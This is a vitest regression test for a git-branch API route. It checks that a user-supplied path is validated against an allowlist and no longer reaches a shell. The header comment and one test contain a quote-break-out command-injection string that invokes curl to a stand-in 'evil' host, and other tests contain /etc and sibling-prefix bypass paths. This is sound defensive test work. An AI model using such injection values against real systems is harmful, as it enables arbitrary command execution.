import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import {
  __resetRealRootCacheForTests,
} from "../../lib/path-allowed.js";

/**
 * Tests for `/api/terminal/git/dir-branch` — the user-supplied `?path=` query
 * parameter was interpolated into a `git -C "${dir}" rev-parse ...` shell
 * template via `execAsync`, so `a"; curl evil; "` broke out of the quotes and
 * executed arbitrary commands as the claude user. The fix routes every git
 * invocation through `execFile` (argv, no shell) AND requires the path to
 * live under the shared ALLOWED_ROOTS list, enforced by `isPathAllowed`.
 *
 * Strategy:
 *   - Build a real git repo under a temp dir so `git -C <dir> rev-parse` has
 *     something legitimate to chew on when the happy path runs.
 *   - Mock `lib/path-allowed.js` so the route's private ALLOWED_ROOTS const
 *     (which hard-codes /home/claude/... paths) is replaced with a
 *     test-controlled allowlist seeded from the temp dir. The mock delegates
 *     to the REAL `isPathAllowed` implementation so the security semantics
 *     (sibling-prefix, symlink, realpath canonicalization) are exercised
 *     end-to-end — only the root list is swapped.
 *   - Drive the route via Hono's `app.request()` — no listening server.
 */

let sandbox: string;
let repoDir: string;
let evilSibling: string;
let testAllowedRoots: string[] = [];

vi.mock("../../lib/path-allowed.js", async () => {
  const real = await vi.importActual<typeof import("../../lib/path-allowed.js")>(
    "../../lib/path-allowed.js",
  );
  return {
    ...real,
    isPathAllowed: async (candidate: string, _ignoredRoots: string[]) => {
      return real.isPathAllowed(candidate, testAllowedRoots);
    },
  };
});

const { gitRoute } = await import("../terminal/git.js");

beforeAll(() => {
  process.env.NODE_ENV = "test";
  sandbox = mkdtempSync(join(tmpdir(), "cpc-git-test-"));
  repoDir = join(sandbox, "repo");
  mkdirSync(repoDir, { recursive: true });
  // Initialize a real git repo so rev-parse has a branch to report. Use
  // spawnSync with argv so the test doesn't itself shell out. --initial-branch
  // pins the branch name so the test is deterministic across git versions.
  const init = spawnSync("git", ["-C", repoDir, "init", "-q", "--initial-branch=main"], {
    encoding: "utf-8",
  });
  if (init.status !== 0) throw new Error(`git init failed: ${init.stderr}`);
  // Need at least one config so future `git` commands don't warn about identity.
  spawnSync("git", ["-C", repoDir, "config", "user.email", "test@example.com"]);
  spawnSync("git", ["-C", repoDir, "config", "user.name", "test"]);
  // Create an initial commit so `rev-parse --abbrev-ref HEAD` resolves to
  // "main" instead of exiting with "unknown revision HEAD". Without this,
  // the happy-path assertion gets caught by the route's catch block and
  // returns { ok: true, branch: null } which is the shape reserved for
  // "path exists but isn't a git repo."
  writeFileSync(join(repoDir, "README.md"), "test");
  const add = spawnSync("git", ["-C", repoDir, "add", "README.md"], { encoding: "utf-8" });
  if (add.status !== 0) throw new Error(`git add failed: ${add.stderr}`);
  const commit = spawnSync(
    "git",
    ["-C", repoDir, "commit", "-q", "-m", "init"],
    { encoding: "utf-8" },
  );
  if (commit.status !== 0) throw new Error(`git commit failed: ${commit.stderr}`);
  // Sibling-prefix directory — shares the sandbox string prefix but is a
  // separate path segment. Must NOT be reachable even though startsWith() would
  // say yes.
  evilSibling = `${repoDir}-evil`;
  mkdirSync(evilSibling, { recursive: true });
  writeFileSync(join(evilSibling, "loot.txt"), "loot");

  testAllowedRoots = [repoDir];
  __resetRealRootCacheForTests();
});

afterAll(() => {
  rmSync(sandbox, { recursive: true, force: true });
  rmSync(evilSibling, { recursive: true, force: true });
  __resetRealRootCacheForTests();
});

beforeEach(() => {
  __resetRealRootCacheForTests();
});

async function getDirBranch(path: string | null) {
  const params = new URLSearchParams();
  if (path !== null) params.set("path", path);
  const res = await gitRoute.request(`/dir-branch?${params.toString()}`);
  const body = (await res.json()) as {
    ok: boolean;
    error?: string;
    branch?: string | null;
    isWorktree?: boolean;
  };
  return { status: res.status, body };
}

describe("/dir-branch path validation (M-3)", () => {
  it("rejects a path containing a double-quote shell break-out with 403", async () => {
    // The exploit vector: `?path=a"; curl evil; "` would have broken out of the
    // shell-quoted template. resolve() + isPathAllowed rejects it before any
    // git call; the path doesn't exist anywhere under ALLOWED_ROOTS.
    const { status, body } = await getDirBranch('a"; curl evil; "');
    expect(status).toBe(403);
    expect(body.ok).toBe(false);
  });

  it("rejects a /etc path with 403 (outside allowlist)", async () => {
    const { status, body } = await getDirBranch("/etc");
    expect(status).toBe(403);
    expect(body.error).toBe("path not allowed");
  });

  it("rejects a sibling-prefix path with 403 (the classic startsWith bypass)", async () => {
    // evilSibling = `${repoDir}-evil`. Shares repoDir as a string prefix but
    // is a separate path segment. Shared isPathAllowed enforces a
    // path-segment boundary so this MUST be rejected.
    const { status, body } = await getDirBranch(evilSibling);
    expect(status).toBe(403);
    expect(body.error).toBe("path not allowed");
  });

  it("rejects a non-existent path with 403 (realpath fails)", async () => {
    const { status } = await getDirBranch(join(repoDir, "does-not-exist"));
    expect(status).toBe(403);
  });

  it("returns the current branch for a path under the allowlist (happy path)", async () => {
    const { status, body } = await getDirBranch(repoDir);
    expect(status).toBe(200);
    expect(body.ok).toBe(true);
    expect(body.branch).toBe("main");
    // Fresh `git init` is a main-tree, not a worktree.
    expect(body.isWorktree).toBe(false);
  });

  it("rejects missing path query with 400", async () => {
    const res = await gitRoute.request("/dir-branch");
    const body = (await res.json()) as { ok: boolean; error?: string };
    expect(res.status).toBe(400);
    expect(body.error).toBe("path required");
  });
});
